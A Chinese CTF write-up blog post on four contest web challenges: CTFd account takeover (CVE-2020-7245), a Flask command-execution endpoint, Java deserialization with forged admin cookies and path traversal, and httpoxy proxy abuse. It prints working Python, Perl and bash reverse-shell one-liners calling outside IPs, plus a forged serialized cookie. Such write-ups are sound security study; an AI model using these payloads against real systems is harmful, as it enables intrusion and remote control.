<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="cop's blog"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.5"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.5"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><title>2.29考核赛 | cop's blog</title></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">2.29考核赛</h1><a id="logo" href="/.">cop's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Inicio</i></a><a href="/archives/"><i class="fa fa-archive"> Archivo</i></a><a href="/about/"><i class="fa fa-user"> Acerca de</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="Búsqueda"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">2.29考核赛</h1><div class="post-meta"><a href="/2020/03/01/2.29考核赛/#comments" class="comment-count"></a><p><span class="date">Mar 01, 2020</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>Golpes</i></i></span></p></div><div class="post-content"><p>对不起我太菜了，只出了最简单的一题<br><img src="https://uploader.shimo.im/f/2UjgIZmhu7U7Gv20.png" alt><br>附赵师傅的<a href>wp</a>和p3师傅的<a href="https://p3rh4ps.top/index.php/2020/02/29/275/" target="_blank" rel="noopener">wp</a></p>
<h2 id="happyctfd"><a href="#happyctfd" class="headerlink" title="happyctfd"></a>happyctfd</h2><p>这题搜一下找到了个ctfd最近的cve CVE-2020-7245<br>1.注册一个admin最前面或最后加一个空格的账号<br>2.发一个忘记密码的链接<br>3.登陆账号改成其他用户名<br>4.用收到的忘记密码链接改密码<br>然后就改掉了admin的密码，登陆之后在admin page找刀一个隐藏的题，flag在附件里</p>
<h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line">@app.route(<span class="string">'/shell'</span>)</span><br><span class="line">def shell():</span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="built_in">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">def <span class="built_in">source</span>():</span><br><span class="line">    <span class="built_in">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
<p>这题做哭了，想了好久，一直用python反弹，却忘了版本问题，死活弹不出来，题目环境是py3<br><img src="https://uploader.shimo.im/f/acOh4NrWYx4RRpWh.jpg" alt><br><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("174.0.220.195",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p>
<p>还有perl弹shell,我真是太菜了啥都不会233<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="174.0.220.195";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p>
<p>然后就是找打开这个文件的进程，没有lsof权限，只能一个一个找了，还没有curl权限，之前拿curl也试了好久，都不通<br>然后直接去/proc去找，一个一个找，在/proc/10/fd下cat <em>,找到flag，从nepnep学到一种操作是cat /proc/</em>/fd/*<br>还有这题其实不用弹shell也能做,把执行命令结果写进app.py里（要先把app.py删了，要不然写不进去），在主页可以看到，当时我用lsof啥都没有，<br>也没想到没有lsof的权限就没试了，太菜了</p>
<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>一道java题，这题我是尽力了，还是没做出来<br>下载源码，反编译class文件，一个在线反编译的<a href="http://javare.cn/" target="_blank" rel="noopener">网站</a>,也可以用java decompiler<br>com.controller.PictureController.class<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&#123;<span class="string">"/showpic.form"</span>&#125;)</span><br><span class="line">public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception &#123;</span><br><span class="line">   <span class="keyword">if</span>(file == null) &#123;</span><br><span class="line">      file = <span class="string">"showpic.jsp"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   String[] attribute = file.split(<span class="string">"\\."</span>);</span><br><span class="line">   String suffix = attribute[attribute.length - 1];</span><br><span class="line">   <span class="keyword">if</span>(!suffix.equals(<span class="string">"jsp"</span>)) &#123;</span><br><span class="line">      boolean var11 = ((ClientInfo)httpServletRequest.getSession().getAttribute(<span class="string">"cinfo"</span>)).getName().equals(<span class="string">"admin"</span>);</span><br><span class="line">      <span class="keyword">if</span>(!var11 &amp;&amp; (!suffix.equals(<span class="string">"jpg"</span>) || !suffix.equals(<span class="string">"gif"</span>))) &#123;</span><br><span class="line">         <span class="built_in">return</span> <span class="string">"onlypic"</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         this.show(httpServletRequest, httpServletResponse, file);</span><br><span class="line">         <span class="built_in">return</span> <span class="string">"showpic"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line"></span><br><span class="line">      int unixSep;</span><br><span class="line">      <span class="keyword">for</span>(unixSep = 0; unixSep &lt; attribute.length - 1; ++unixSep) &#123;</span><br><span class="line">         stringBuilder.append(attribute[unixSep]);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String jspFile = stringBuilder.toString();</span><br><span class="line">      unixSep = jspFile.lastIndexOf(47);</span><br><span class="line">      int winSep = jspFile.lastIndexOf(92);</span><br><span class="line">      int pos = winSep &gt; unixSep?winSep:unixSep;</span><br><span class="line">      jspFile = pos != -1?jspFile.substring(pos + 1):jspFile;</span><br><span class="line">      <span class="keyword">if</span>(jspFile.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">         jspFile = <span class="string">"showpic"</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">return</span> jspFile;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception &#123;</span><br><span class="line">   httpServletResponse.setContentType(<span class="string">"image/jpeg"</span>);</span><br><span class="line">   Object <span class="keyword">in</span> = httpServletRequest.getServletContext().getResourceAsStream(<span class="string">"/WEB-INF/resource/"</span> + filename);</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">in</span> == null) &#123;</span><br><span class="line">      <span class="keyword">in</span> = new FileInputStream(filename);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   ServletOutputStream os = httpServletResponse.getOutputStream();</span><br><span class="line">   byte[] b = new byte[1024];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span>(((InputStream)<span class="keyword">in</span>).<span class="built_in">read</span>(b) != -1) &#123;</span><br><span class="line">      os.write(b);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   ((InputStream)<span class="keyword">in</span>).close();</span><br><span class="line">   os.flush();</span><br><span class="line">   os.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@RequestMapping(&#123;<span class="string">"/uploadpic.form"</span>&#125;)</span><br><span class="line">public String upload(MultipartFile file, HttpServletRequest request, HttpServletResponse response) throws Exception &#123;</span><br><span class="line">   ClientInfo cinfo = (ClientInfo)request.getSession().getAttribute(<span class="string">"cinfo"</span>);</span><br><span class="line">   <span class="keyword">if</span>(!cinfo.getGroup().equals(<span class="string">"webmanager"</span>)) &#123;</span><br><span class="line">      <span class="built_in">return</span> <span class="string">"notaccess"</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span>(file == null) &#123;</span><br><span class="line">      <span class="built_in">return</span> <span class="string">"uploadpic"</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      String originalFilename = ((DiskFileItem)((CommonsMultipartFile)file).getFileItem()).getName();</span><br><span class="line">      String realPath = request.getSession().getServletContext().getRealPath(<span class="string">"/WEB-INF/resource/"</span>);</span><br><span class="line">      String path = realPath + originalFilename;</span><br><span class="line">      file.transferTo(new File(path));</span><br><span class="line">      request.getSession().setAttribute(<span class="string">"newpicfile"</span>, path);</span><br><span class="line">      <span class="built_in">return</span> <span class="string">"uploadpic"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>第一次看java代码，只能勉强读读，可以看到有个upload和show，但是对权限都有要求<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cinfo.getGroup().equals(<span class="string">"webmanager"</span>)</span><br><span class="line">getSession().getAttribute(<span class="string">"cinfo"</span>)).getName().equals(<span class="string">"admin"</span>)</span><br></pre></td></tr></table></figure></p>
<p>equals是比较是不是这个值，然后在com.filters.ClentInfoFilter.class找到对cookie的操作<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">public class ClentInfoFilter implements Filter &#123;</span><br><span class="line">  public void init(FilterConfig fcg) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">    Cookie[] cookies = ((HttpServletRequest)request).getCookies();</span><br><span class="line">    boolean exist = <span class="literal">false</span>;</span><br><span class="line">    Cookie cookie = null;</span><br><span class="line">    <span class="keyword">if</span> (cookies != null)</span><br><span class="line">      <span class="keyword">for</span> (Cookie c : cookies) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c.getName().equals(<span class="string">"cinfo"</span>)) &#123;</span><br><span class="line">          exist = <span class="literal">true</span>;</span><br><span class="line">          cookie = c;</span><br><span class="line">          <span class="built_in">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">      &#125;  </span><br><span class="line">    <span class="keyword">if</span> (exist) &#123;</span><br><span class="line">      String b64 = cookie.getValue();</span><br><span class="line">      Base64.Decoder decoder = Base64.getDecoder();</span><br><span class="line">      byte[] bytes = decoder.decode(b64);</span><br><span class="line">      ClientInfo cinfo = null;</span><br><span class="line">      <span class="keyword">if</span> (b64.equals(<span class="string">""</span>) || bytes == null) &#123;</span><br><span class="line">        cinfo = new ClientInfo(<span class="string">"Anonymous"</span>, <span class="string">"normal"</span>, ((HttpServletRequest)request).getRequestedSessionId());</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">        try &#123;</span><br><span class="line">          bytes = Tools.create(cinfo);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">        &#125; </span><br><span class="line">        cookie.setValue(encoder.encodeToString(bytes));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">          cinfo = (ClientInfo)Tools.parse(bytes);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">      ((HttpServletRequest)request).getSession().setAttribute(<span class="string">"cinfo"</span>, cinfo);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">      try &#123;</span><br><span class="line">        ClientInfo cinfo = new ClientInfo(<span class="string">"Anonymous"</span>, <span class="string">"normal"</span>, ((HttpServletRequest)request).getRequestedSessionId());</span><br><span class="line">        byte[] bytes = Tools.create(cinfo);</span><br><span class="line">        cookie = new Cookie(<span class="string">"cinfo"</span>, encoder.encodeToString(bytes));</span><br><span class="line">        cookie.setMaxAge(86400);</span><br><span class="line">        ((HttpServletResponse)response).addCookie(cookie);</span><br><span class="line">        ((HttpServletRequest)request).getSession().setAttribute(<span class="string">"cinfo"</span>, cinfo);</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>大概就是先判断存不存在cookie，存在的话直接返回，不存在就新建一个cookie对象，用户名是Anonymous 用户组是normal<br>刚开始直接base64解码cookie<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%AC%ED%00%05sr%00%14com.tools.ClientInfo%00%00%00%00%00%00%00%01%02%00%03L%00%05groupt%00%12Ljava%2Flang%2FString%3BL%00%02idq%00%7E%00%01L%00%04nameq%00%7E%00%01xpt%00%06normalpt%00%09Anonymous</span><br></pre></td></tr></table></figure></p>
<p>很明显看到后面是用户组和用户名，尝试多次修改，终于知道该怎么改成webmanager admin了<br>这个序列化数据前面的%06代表是6个字符，所以最后就改成  %00%0awebmanagerpt%00%05admin<br>拼上之后用php写个加密，get传值得到cookie<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABRjb20udG9vbHMuQ2xpZW50SW5mbwAAAAAAAAABAgADTAAFZ3JvdXB0ABJMamF2YS9sYW5nL1N0cmluZztMAAJpZHEAfgABTAAEbmFtZXEAfgABeHB0AAp3ZWJtYW5hZ2VycHQABWFkbWlu</span><br></pre></td></tr></table></figure></p>
<p>其实这里应该像写pop链子一样，改改代码，再运行一下，我这么直接改的纯属运气，但是我本地java web环境没搭好，改代码也不怎么会改<br>刚开始想着就直接改改上面那个com.filters.ClentInfoFilter.class,新建cookie对象的参数，再反编译一下运行，结果反编译成java各种出错<br>找了好多，感觉这种带有其他java包依赖的文件太难改了嘤嘤嘤，现在照着赵师傅的改一下</p>
<p>改了cookie之后可以上传文件了，但是发现上传失败，默认上传到/WEB-INF/resource/，猜测这个文件夹没有权限 路径部分是直接拼接的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String originalFilename = ((DiskFileItem)((CommonsMultipartFile)file).getFileItem()).getName();</span><br><span class="line">String realPath = request.getSession().getServletContext().getRealPath(&quot;/WEB-INF/resource/&quot;);</span><br><span class="line">String path = realPath + originalFilename;</span><br></pre></td></tr></table></figure></p>
<p>试了下可以跨目录传到/tmp，然后就是在show的包含了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">int unixSep;</span><br><span class="line"><span class="keyword">for</span>(unixSep = 0; unixSep &lt; attribute.length - 1; ++unixSep) &#123;</span><br><span class="line">        stringBuilder.append(attribute[unixSep]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        String jspFile = stringBuilder.toString();</span><br><span class="line">        unixSep = jspFile.lastIndexOf(47);</span><br><span class="line">        int winSep = jspFile.lastIndexOf(92);</span><br><span class="line">         int pos = winSep &gt; unixSep?winSep:unixSep;</span><br><span class="line">         jspFile = pos != -1?jspFile.substring(pos + 1):jspFile;</span><br><span class="line">         <span class="keyword">if</span>(jspFile.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            jspFile = <span class="string">"showpic"</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">return</span> jspFile;</span><br></pre></td></tr></table></figure></p>
<p>但是这部分死活不能跨目录包含jsp马,搜了一下也tomcat好像只解析jsp，还是只能小写的<br><img src="https://uploader.shimo.im/f/PWbPROtuJGAVHGFz.jpg" alt><br>不是jsp后缀的文件是可以任意读的，试了下没有flag，有个readflag，惨，必须要rce啊<br>跟着赵师傅和p3师傅的来了，看到这里<br><img src="https://uploader.shimo.im/f/862JZpBfwDQUgDfM.png" alt><br>判断cookie，base64解码是否失败，或者是空的，如果不是直接进入Tools.parse<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static Object parse(byte[] bytes) throws Exception &#123;</span><br><span class="line">    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));</span><br><span class="line">    <span class="built_in">return</span> ois.readObject();</span><br><span class="line">  &#125;</span><br><span class="line">private void readObject(ObjectInputStream <span class="keyword">in</span>) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    Object obj = in.readObject();</span><br><span class="line">    (new ProcessBuilder((String[])obj)).start();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p><a href="https://xz.aliyun.com/t/6787" target="_blank" rel="noopener">https://xz.aliyun.com/t/6787</a>  p3师傅博客中找到这篇文章，讲了在readobject重现不当可能会造成rce<br>这里明显重写了readObject，new ProcessBuilder((String[])obj)<br><img src="http://p3rh4ps.top/wp-content/uploads/2020/02/image-20200229215255469.png" alt><br>可以调用可变函数，执行命令,以数组的形式传入参数，这里看赵师傅的直接把testcall属性改成了数组，然后其他操作我也不怎么看的懂<br>毕竟java太菜了，测试了一下(String[])obj返回的是testcall的属性值，这里我就像php反序列化一样直接写它的值，试了一下是可以的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private String testCall[]=&#123;<span class="string">"bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i&gt;&amp; /dev/tcp/174.0.223.5/2333 0&gt;&amp;1"</span>&#125;;;</span><br></pre></td></tr></table></figure></p>
<p>剩下的照着p3师傅的写的<br><img src="https://uploader.shimo.im/f/vbVjHLF8SJE9rYDw.png" alt><br>修改cookie刷新一下就收到shell了，太菜了，先知那篇java反序列化看的也是一愣一愣的<br><img src="https://uploader.shimo.im/f/PWbPROtuJGAVHGFz.jpg" alt></p>
<h2 id="TimeTravle"><a href="#TimeTravle" class="headerlink" title="TimeTravle"></a>TimeTravle</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require __DIR__ . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">use GuzzleHttp\Client;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    <span class="variable">$client</span> = new Client();</span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody();</span><br><span class="line">    <span class="variable">$data</span> = json_decode(<span class="variable">$content</span>, TRUE);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">'success'</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="built_in">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="variable">$_GET</span>[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题有个任意文件读取，然后读到是一个GuzzleHttp的框架，搜了一下没找到什么洞，我就没啥思路了tcl<br><a href="https://httpoxy.org/" target="_blank" rel="noopener">https://httpoxy.org/</a>  这是p3师傅找到的httpoxy的洞，还有这篇分析 <a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">https://www.laruence.com/2016/07/19/3101.html</a><br>这个洞的前提<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你的服务会对外请求资源</span><br><span class="line">你的服务使用了HTTP_PROXY(大写的)环境变量来代理你的请求（可能是你自己写，或是使用一些有缺陷的类库）</span><br><span class="line">你的服务跑在PHP的CGI模式下(cgi, php-fpm)</span><br></pre></td></tr></table></figure></p>
<p>作用就是代理这个对外请求，可以让这个请求到任意内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">import json</span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/api/eligible'</span>)</span><br><span class="line">def <span class="built_in">source</span>():</span><br><span class="line">    <span class="built_in">return</span> json.dumps(&#123;<span class="string">"success"</span>: True&#125;)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>)</span><br></pre></td></tr></table></figure></p>
<p>buu的靶机python没装flask，照着p3师傅用php写一个，要写在api/eligible目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span>=array(<span class="string">"success"</span>=&gt;<span class="literal">true</span>);</span><br><span class="line"><span class="built_in">echo</span> json_encode(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>修改apache web端口为5000，加个Proxy头<br><img src="https://uploader.shimo.im/f/PT6oeSsN8WswiVoV.png" alt></p>
<p>这次比赛学到很多操作，赵师傅出的题都是没见过的，我就搜到了一个，可见我搜索信息的能力还是太低<br>还有114师傅实在是太顶了，2小时ak web,我tm怎么这么菜<br><img src="https://uploader.shimo.im/f/56YhaIQICukygdGa.png" alt></p>
